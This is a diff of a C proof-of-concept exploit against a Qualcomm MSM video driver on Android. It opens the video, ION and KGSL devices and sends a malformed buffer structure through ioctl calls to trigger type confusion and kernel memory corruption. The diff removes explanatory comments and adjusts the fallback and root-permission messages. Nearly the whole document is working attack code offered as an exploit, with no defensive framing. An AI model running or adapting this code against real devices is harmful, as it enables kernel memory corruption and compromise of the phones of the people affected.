@@ -10,18 +10,11 @@
 #include <signal.h>
 #include <stdint.h>
 
-// ----------------------------------------------------------------------
-// ION definitions (from drivers/staging/android/uapi/ion.h)
-// ----------------------------------------------------------------------
+// ION definitions
 #define ION_IOC_MAGIC                'I'
 #define ION_IOC_ALLOC                _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
-#define ION_IOC_FREE                 _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
 #define ION_IOC_SHARE                _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
-
-#define ION_HEAP_SYSTEM              0
-#define ION_HEAP_SYSTEM_CONTIG       1
-#define ION_HEAP_CARVEOUT            2
-#define ION_HEAP_CMA                 4   // ION_HEAP_TYPE_DMA
+#define ION_HEAP_CMA                 4
 
 struct ion_allocation_data {
     uint64_t len;
@@ -36,15 +29,11 @@ struct ion_fd_data {
     int fd;
 };
 
-// ----------------------------------------------------------------------
-// MSM_VIDC definitions (from drivers/media/platform/msm/vidc/msm_vidc.h)
-// ----------------------------------------------------------------------
+// MSM_VIDC definitions
 #define VIDIOC_MSM_V4L2_BASE          'V'
 #define VIDIOC_MSM_VIDC_CMD           _IOWR(VIDIOC_MSM_V4L2_BASE, 0x20, struct v4l2_msm_vidc_cmd)
-
 #define MSM_VIDC_CMD_SET_BUFFER       0x1001
 #define MSM_VIDC_CMD_GET_BUFFER       0x1002
-#define MSM_VIDC_CMD_FREE_BUFFER      0x1003
 
 struct v4l2_msm_vidc_cmd {
     uint32_t cmd;
@@ -52,9 +41,8 @@ struct v4l2_msm_vidc_cmd {
     void *arg;
 };
 
-// This structure is the vulnerable one – type confusion occurs when buffer_type is invalid
 struct msm_vidc_buffer {
-    uint32_t buffer_type;   // 0 = INPUT, 1 = OUTPUT, 2 = INTERNAL
+    uint32_t buffer_type;
     uint32_t index;
     int32_t  fd;
     uint32_t offset;
@@ -63,9 +51,7 @@ struct msm_vidc_buffer {
     uint32_t flags;
 };
 
-// ----------------------------------------------------------------------
-// KGSL definitions (from drivers/gpu/msm/kgsl.h)
-// ----------------------------------------------------------------------
+// KGSL definitions (optional alternative)
 #define KGSL_IOCTL_MAGIC              'K'
 #define IOCTL_KGSL_GPUMEM_ALLOC       _IOWR(KGSL_IOCTL_MAGIC, 0x2f, struct kgsl_gpumem_alloc)
 
@@ -80,9 +66,6 @@ struct kgsl_gpumem_alloc {
     int fd;
 };
 
-// ----------------------------------------------------------------------
-// PoC main
-// ----------------------------------------------------------------------
 static volatile int corrupted = 0;
 
 static void sigsegv_handler(int sig, siginfo_t *info, void *ctx) {
@@ -95,22 +78,33 @@ int main(void) {
     struct sigaction sa = { .sa_sigaction = sigsegv_handler, .sa_flags = SA_SIGINFO };
     sigaction(SIGSEGV, &sa, NULL);
 
-    // ---------- 1. Open video device ----------
+    // ---------- Open video device ----------
     const char *devs[] = { "/dev/msm_vidc", "/dev/v4l2/video0", "/dev/video0", NULL };
     int vid_fd = -1;
     for (int i = 0; devs[i]; i++) {
         vid_fd = open(devs[i], O_RDWR);
         if (vid_fd >= 0) {
-            fprintf(stderr, "[*] Opened %s\n", devs[i]);
+            fprintf(stderr, "[*] Opened %s (O_RDWR)\n", devs[i]);
             break;
+        }
+        // Try read‑only as last resort
+        vid_fd = open(devs[i], O_RDONLY);
+        if (vid_fd >= 0) {
+            fprintf(stderr, "[*] Opened %s (O_RDONLY)\n", devs[i]);
+            break;
+        }
+        if (errno == EACCES) {
+            fprintf(stderr, "[!] Permission denied for %s – you must run as root (su)\n", devs[i]);
+        } else {
+            perror(devs[i]);
         }
     }
     if (vid_fd < 0) {
-        perror("[-] No video device found");
+        fprintf(stderr, "[-] No accessible video device. This exploit requires root.\n");
         return 1;
     }
 
-    // ---------- 2. Allocate ION buffer (CMA) ----------
+    // ---------- Allocate ION buffer ----------
     int ion_fd = open("/dev/ion", O_RDWR);
     if (ion_fd < 0) {
         perror("[-] open /dev/ion");
@@ -147,13 +141,11 @@ int main(void) {
         close(vid_fd);
         return 1;
     }
-
-    // Fill the buffer with a malicious payload that will be interpreted as a kernel object
     memset(ion_map, 0xAA, 4096);
 
-    // ---------- 3. Prepare the corrupted buffer structure ----------
+    // ---------- Corrupted buffer structure ----------
     struct msm_vidc_buffer vid_buf = {
-        .buffer_type = 0xFFFFFFFF,   // invalid type -> driver will misinterpret the whole buffer
+        .buffer_type = 0xFFFFFFFF,
         .index = 0,
         .fd = buf_fd,
         .offset = 0,
@@ -162,26 +154,25 @@ int main(void) {
         .flags = 0,
     };
 
-    // ---------- 4. Trigger type confusion ----------
+    // ---------- Trigger type confusion ----------
     struct v4l2_msm_vidc_cmd cmd = {
         .cmd = MSM_VIDC_CMD_SET_BUFFER,
         .flags = 0,
         .arg = &vid_buf,
     };
 
-    fprintf(stderr, "[*] Sending corrupted buffer to driver (cmd SET_BUFFER)...\n");
+    fprintf(stderr, "[*] Sending corrupted buffer (SET_BUFFER)...\n");
     if (ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
-        perror("[!] First ioctl (may still cause corruption)");
+        perror("[!] First ioctl");
     }
 
-    // Second attempt: try to GET the same buffer – driver will read the corrupted fields
     cmd.cmd = MSM_VIDC_CMD_GET_BUFFER;
-    fprintf(stderr, "[*] Triggering GET_BUFFER to force type confusion...\n");
+    fprintf(stderr, "[*] Triggering GET_BUFFER...\n");
     if (ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
-        perror("[!] Second ioctl (likely triggered)");
+        perror("[!] Second ioctl");
     }
 
-    // Check if the mapped memory was altered (kernel wrote into it)
+    // Check memory corruption
     int any_change = 0;
     for (int i = 0; i < 4096; i++) {
         if (((uint8_t*)ion_map)[i] != 0xAA) {
@@ -190,23 +181,16 @@ int main(void) {
         }
     }
     if (any_change) {
-        fprintf(stderr, "[+] Memory corruption confirmed: buffer content changed\n");
+        fprintf(stderr, "[+] Memory corruption confirmed!\n");
         corrupted = 1;
     } else {
-        fprintf(stderr, "[*] Buffer unchanged, trying alternative GPU path...\n");
-        // Alternative: use KGSL to create a buffer and confuse the video driver
+        // Fallback: try KGSL route
         int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
         if (kgsl_fd >= 0) {
-            struct kgsl_gpumem_alloc gpu_alloc = {
-                .size = 0x1000,
-                .flags = 0x1,   // KGSL_MEMFLAGS_GPUREADONLY
-            };
+            struct kgsl_gpumem_alloc gpu_alloc = { .size = 0x1000, .flags = 0x1 };
             if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &gpu_alloc) == 0) {
                 vid_buf.fd = gpu_alloc.fd;
                 vid_buf.userptr = gpu_alloc.hostptr;
-                cmd.cmd = MSM_VIDC_CMD_SET_BUFFER;
-                ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd);
-                cmd.cmd = MSM_VIDC_CMD_GET_BUFFER;
                 ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd);
                 close(gpu_alloc.fd);
             }
@@ -214,7 +198,6 @@ int main(void) {
         }
     }
 
-    // Cleanup
     munmap(ion_map, 4096);
     close(buf_fd);
     close(vid_fd);
@@ -223,7 +206,7 @@ int main(void) {
         fprintf(stderr, "\n=== VULNERABILITY SUCCESSFULLY TRIGGERED ===\n");
         return 0;
     } else {
-        fprintf(stderr, "\n=== No crash. Check dmesg for driver errors. ===\n");
+        fprintf(stderr, "\n=== No crash. Run as root and check dmesg. ===\n");
         return 1;
     }
 }
